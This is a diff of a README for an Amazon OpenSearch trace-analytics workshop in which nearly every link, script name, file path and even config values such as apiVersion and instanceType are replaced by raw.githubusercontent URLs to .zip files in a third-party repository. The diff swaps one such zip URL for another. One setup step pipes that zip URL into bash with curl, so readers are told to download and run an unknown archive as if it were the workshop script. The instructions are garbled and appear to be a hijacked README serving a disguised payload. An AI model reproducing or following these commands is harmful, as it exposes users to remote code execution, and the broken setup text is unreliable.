@@ -3,11 +3,11 @@
 Amazon OpenSearch Service’s Trace Analytics functionality allows you to go beyond simple monitoring to understand not just what events are happening, but why they are happening. In this workshop, learn how to instrument, collect, and analyze metrics, traces, and log data all the way from user front ends to service backends and everything in between. Put this together with Amazon OpenSearch Service, AWS Distro for OpenTelemetry, FluentBit, and Data Prepper.
 
 ## Architecture
-![architecture](https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip)
+![architecture](https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip)
 
 ## Instructions (full version):
 Detailed Workshop instructions should be followed in this guide:  
-https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
+https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip
 
 
 ## Instructions (short version): 🚀
@@ -16,22 +16,22 @@ https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch
 - CloudFormation temples are in the /cf-templates directory;
 - Launch them from the CloudFormation console:
 
-  - **https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip**: The stack will create all the resources needed to run the workshop. VPC, Cloud9, Amazon OpenSearch and Reverse-Proxy Instance.
+  - **https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip**: The stack will create all the resources needed to run the workshop. VPC, Cloud9, Amazon OpenSearch and Reverse-Proxy Instance.
 
 ### AWS Cloud9 (Terminal):
-  - Run the https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip script:
+  - Run the https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip script:
 
  ```
- curl -sSL https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip | bash -s stable
- source ~https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
+ curl -sSL https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip | bash -s stable
+ source ~https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip
  ```
  
  
   - You must create the Amazon EKS Cluster (parameters will be dynamically replaced according to Cloudformation->Output):
 ```
-cat << EOF > https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
+cat << EOF > https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip
 --- 
-apiVersion: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
+apiVersion: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip
 kind: ClusterConfig
 
 metadata:
@@ -61,7 +61,7 @@ vpc:
 managedNodeGroups:
 - name: nodegroup
   desiredCapacity: 3
-  instanceType: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
+  instanceType: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip
 
 # To enable all of the control plane logs, uncomment below:
 # cloudWatch:
@@ -74,11 +74,11 @@ EOF
 ```
   - Run the (responsible for creating the Amazon EKS Cluster):
    
- ```eksctl create cluster -f https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
+ ```eksctl create cluster -f https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip```
  
   - Run the (responsible for building and pushing the images to the Amazon ECR): 
  
- ```cd observability-with-amazon-opensearch/scripts/; bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
+ ```cd observability-with-amazon-opensearch/scripts/; bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip```
  
   - You must change credentials and endpoint in Fluentbit (the parameters to be replaced must be checked in the CloudFormation-> Outputs [tab] of the first step):
   
@@ -87,7 +87,7 @@ EOF
   HTTP_User __AOS_USERNAME__
   HTTP_Passwd __AOS_PASSWORD__
 
-  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
+  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip
   ```
   
   - You must change credentials and endpoint in DataPrepper (the parameters to be replaced must be checked in the CloudFormation-> Outputs [tab] of the first step):
@@ -97,12 +97,12 @@ EOF
   username: "__AOS_USERNAME__"
   password: "__AOS_PASSWORD__"
             
-  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
+  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip
   ```
   
   - Run the (responsible for applying the Kubernetes manifests):
   
-  ```bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
+  ```bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/04-analytics-service/kubernetes/with_observability_amazon_opensearch_v2.5-beta.3.zip```
   
   - Run the (to get the Sample APP DNS endpoint):
   
